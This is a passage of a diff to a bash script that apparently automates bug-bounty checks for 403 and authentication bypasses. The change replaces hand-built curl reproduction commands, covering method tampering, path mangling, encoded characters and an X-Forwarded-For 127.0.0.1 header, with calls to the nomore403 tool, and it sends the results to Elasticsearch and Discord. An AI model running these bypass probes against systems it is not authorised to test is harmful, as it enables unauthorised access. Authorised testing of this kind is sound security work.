     db_confirm "$host" "${base_url:-https://$host}" "$program" "auth-bypass" "auth-bypass" "$new_score" \
       "$(awk -v c="${best_conf:-0}" 'BEGIN{printf "%.2f",(c+0)/100}')" \
       "$(jq -nc --arg w "${waf:-?}" --arg t "${best_tech:-?}" --argjson c "${best_conf:-0}" --argjson p "$bypass_records" \
-          '{probe:"bypass-auth-differential", waf:$w, technique:$t, top_confidence:$c, paths:$p}' 2>/dev/null)"
+          '{probe:"nomore403-auth-differential", waf:$w, technique:$t, top_confidence:$c, paths:$p}' 2>/dev/null)"
 
-    # Discord alert — pick the single highest-confidence record for the embed.
+    # Discord alert — single highest-confidence record for the embed.
     top_rec="$(jq -c 'sort_by(-.confidence) | .[0]' <<< "$bypass_records")"
     top_path="$(jq -r '.path' <<< "$top_rec")"
     top_tech="$(jq -r '.technique' <<< "$top_rec")"
     top_conf="$(jq -r '.confidence' <<< "$top_rec")"
     top_code="$(jq -r '.code' <<< "$top_rec")"
+    top_payload="$(jq -r '.payload' <<< "$top_rec")"
     repro_url="${base_url%/}${top_path}"
+    # Reproducible via nomore403 itself; payload shows the exact mutation.
+    repro="nomore403 -u \"$repro_url\" -k $top_tech --random-agent   # payload: $top_payload"
 
-    # Reproduction curl — header-style techniques get -H, mangling techniques
-    # get the mangled URL as-is. Best-effort, manual verification expected.
-    case "$top_tech" in
-      method-*)
-        m_upper="${top_tech#method-}"; m_upper="${m_upper^^}"
-        repro="curl -sS -I -X $m_upper \"$repro_url\""
-        ;;
-      http1.0-downgrade)
-        repro="curl -sS -I --http1.0 \"$repro_url\""
-        ;;
-      double-slash|double-slash-prefix|path-dot|path-dot-slash|trailing-semicolon|\
-      traversal-semicolon|encoded-slash|encoded-dot|encoded-space|encoded-cr|\
-      encoded-lf|unicode-space-prefix|query-bypass|fragment-trick|trailing-hash-percent)
-        # Re-derive mangled URL from variant table (cheap)
-        repro="curl -sS -I \"$(_path_variants "$base_url" "$top_path" | awk -F'\t' -v n="$top_tech" '$1==n {print $2; exit}')\""
-        ;;
-      *)
-        # Default: assume header technique. Re-derive header line from catalog.
-        header_line="$(_techniques_for_waf_dedup "$waf" | awk -F'\t' -v n="$top_tech" '$1==n {print $2; exit}' | tr "$US" '\n' | head -1)"
-        repro="curl -sS -I -H \"${header_line:-X-Forwarded-For: 127.0.0.1}\" \"$repro_url\""
-        ;;
-    esac
-
-    paths_summary="$(jq -r 'sort_by(-.confidence) | .[0:5] | map("  \(.path) → \(.technique) (conf=\(.confidence) code=\(.code))") | join("\n")' <<< "$bypass_records")"
+    paths_summary="$(jq -r 'sort_by(-.confidence) | .[0:5] | map("  \(.path) -> \(.technique) (conf=\(.confidence) code=\(.code))") | join("\n")' <<< "$bypass_records")"
 
     hook="$(discord_hook bypass)"
     if [[ -n "$hook" ]]; then
@@ -740,7 +498,7 @@ while IFS= read -r hit; do
               {name: "All Paths",  value: ("```\n" + $summary + "\n```"), inline: false},
               {name: "Reproduce",  value: ("```\n" + $repro + "\n```"), inline: false}
             ],
-            footer: {text: "recon_bypass — manual verification recommended"},
+            footer: {text: "recon_bypass (nomore403) — manual verification recommended"},
             timestamp: $ts
           }]
         }')"
@@ -748,7 +506,6 @@ while IFS= read -r hit; do
     fi
   else
     log "  no bypass found on any of ${#all_paths[@]} path(s)"
-    # Mark cooldown even on miss
     es_curl -H 'Content-Type: application/json' \
       -X POST "$ES_URL/$INDEX_NAME/_update/$host" \
       -d "$(jq -nc --arg n "$now_iso" --arg waf "$waf" \
@@ -761,4 +518,4 @@ done < <(printf '%s' "$resp" | jq -c '.hits.hits[]')
 
 es_curl -X POST "$ES_URL/$INDEX_NAME/_refresh" > /dev/null 2>&1 || true
 
-log "=== bypass cycle done: $confirmed_count host(s) with confirmed bypass(es) of $host_count tested ==="
+log "=== bypass cycle done (engine=nomore403): $confirmed_count host(s) with confirmed bypass(es) of $host_count tested ==="
